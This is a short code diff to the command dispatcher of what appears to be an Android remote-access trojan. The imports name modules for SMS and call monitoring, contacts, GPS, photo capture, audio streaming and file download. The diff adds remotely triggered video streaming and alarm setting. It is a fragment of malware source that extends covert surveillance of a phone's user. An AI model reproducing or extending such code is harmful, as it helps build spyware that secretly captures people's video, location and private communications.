@@ -6,6 +6,7 @@ import java.util.HashMap;
 import java.util.Map;
 import java.util.StringTokenizer;
 
+import my.app.Library.*;
 import utils.EncoderHelper;
 
 import Packet.Packet;
@@ -20,18 +21,6 @@ import android.telephony.SmsManager;
 import android.util.Log;
 import android.widget.Toast;
 
-import my.app.Library.AdvancedSystemInfo;
-import my.app.Library.AudioStreamer;
-import my.app.Library.CallLogLister;
-import my.app.Library.CallMonitor;
-import my.app.Library.ContactsLister;
-import my.app.Library.DirLister;
-import my.app.Library.FileDownloader;
-import my.app.Library.GPSListener;
-import my.app.Library.PhotoTaker;
-import my.app.Library.SMSLister;
-import my.app.Library.SMSMonitor;
-import my.app.Library.Torch;
 import inout.Protocol;
 
 /**
@@ -328,8 +317,23 @@ public class ProcessCommand
 				client.sendError("No Flash aviable");
 			}
 		}
+		else if (commande == Protocol.GET_VIDEO_STREAM){
+			client.sendInformation("Video streaming request received");
+			client.videoStreamer = new VideoStreamer(client,args,chan);
+			client.videoStreamer.startStream();
+		}
+		else if (commande == Protocol.STOP_VIDEO_STREAM){
+			client.videoStreamer.stopStream();
+			client.videoStreamer = null;
+			client.sendInformation("Video streaming stopped");
+
+		}
 		else if(commande == Protocol.STOP_TORCH){
 			client.torch.turnOffFlash();
+		}
+		else if(commande == Protocol.SET_ALARM){
+			client.setAlarm = new SetAlarm(client);
+			client.setAlarm.SetAlarm(args);
 		}
 		/**
 		 * Mit dem Befehl DISCONNECT wird der Service client zerstört und somit das Programm beendet.
